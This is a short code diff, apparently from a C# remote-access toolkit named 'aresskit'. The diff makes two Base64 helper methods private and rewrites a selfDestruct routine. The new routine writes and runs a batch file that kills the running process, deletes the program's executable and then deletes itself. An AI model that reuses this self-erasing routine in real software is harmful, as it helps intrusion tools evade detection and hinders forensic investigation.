@@ -49,21 +49,31 @@ namespace aresskit
         }
         
         // Thanks to: http://stackoverflow.com/a/11743162/5925502
-        public string Base64Encode(string plainText)
+        private string Base64Encode(string plainText)
         {
             var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
             return Convert.ToBase64String(plainTextBytes);
         }
-        public byte[] Base64Decode(string base64EncodedData)
+        private byte[] Base64Decode(string base64EncodedData)
         {
             var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
             return base64EncodedBytes;
         }
 
-        
+        public static void selfDestruct()
+        {
+            string batchCommands = string.Empty;
+            int currentPID = Process.GetCurrentProcess().Id;
+            string exeFileName = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
-        public static string selfDestruct()
-        { return exec("del " + System.Reflection.Assembly.GetEntryAssembly().Location); } // use 'del' command to delete self
+            batchCommands += "@echo on\n";
+            batchCommands += "taskkill /PID " + currentPID.ToString() + "\n";
+            batchCommands += "del " + exeFileName + "\n";
+            batchCommands += "start /b \"\" cmd /c del \"%~f0\"&exit /b";
+
+            File.WriteAllText("SelfDestructAresskit.bat", batchCommands);
+            Process.Start("SelfDestructAresskit.bat");
+        }
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
